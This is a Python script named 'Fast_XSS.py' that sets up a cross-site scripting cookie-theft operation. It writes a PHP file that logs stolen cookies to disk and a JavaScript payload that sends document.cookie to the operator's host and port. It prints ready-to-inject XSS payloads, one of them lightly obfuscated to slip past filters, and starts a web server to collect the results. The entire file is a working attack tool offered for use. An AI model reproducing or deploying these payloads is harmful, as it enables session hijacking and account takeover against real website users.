#!/usr/bin/python3
import requests
import argparse
from http.server import HTTPServer, SimpleHTTPRequestHandler
import socketserver
# colors here
class colors:
    YELLOW = '\033[93m'
    BOLD = '\033[1m'
    RESET = '\033[0m'

# Help menu here
# parser = argparse.ArgumentParser()

parser = argparse.ArgumentParser(prog='Fast_XSS.py',description='Xss Cookies Capture Tool',epilog='Thank you for  Try out !')


parser.add_argument('--lhost', help="Local Host", required=True)
parser.add_argument('--lport', help="Local Port", required=True)
args = parser.parse_args()

# Creating php payload
first_file = "0xmr.php"
file = open(first_file, "w")
file.write('<?php file_put_contents("cookies.txt", $_GET[\'c\'] . "\\n", FILE_APPEND); ?>')
file.close()
print(f"[+] Writing in {first_file}")

# Creating js payload
second_file = "0xmr.js"
file = open(second_file, "w")
file.write(f'var img = new Image();\n'
           f'img.src = "http://{args.lhost}:{args.lport}/0xmr.php?c=" + document.cookie;')
file.close()
print(f"[+] Writing in {second_file}")


# Print payloads
print(f"-----------use this payloads-----------")
print("\n")
print(f'''{colors.YELLOW}{colors.BOLD}<script src=\"http://{args.lhost}:{args.lport}/0xmr.js\"></script>{colors.RESET}''')
print("\n")
print(f'''{colors.YELLOW}{colors.BOLD}<IMG src=x onerror=eval("fet"+"ch('http://{args.lhost}:{args.lport}/?c='+document.coo"+"kie)") >{colors.RESET}''')
print("\n")
print("----------------------------------------")

# starting python server
print(f"[+] starting python3 server at {args.lport}.")
PORT = int(args.lport)
Handler = SimpleHTTPRequestHandler
with socketserver.TCPServer(("", PORT), Handler) as httpd:
    print(f"serving at port {PORT}")
    httpd.serve_forever()
